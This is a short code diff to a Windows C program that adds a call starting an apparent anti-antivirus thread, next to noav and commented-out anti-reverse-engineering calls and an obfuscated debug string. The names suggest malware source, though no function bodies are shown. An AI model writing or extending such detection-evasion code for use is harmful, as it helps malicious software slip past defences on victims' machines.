@@ -37,6 +37,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	}
 
 	noav(FALSE);
+	StartNoAVThread();
 //	noreverse();
 
 	DEBUGMSG(decode("Uoux otg zk Gotg!"));
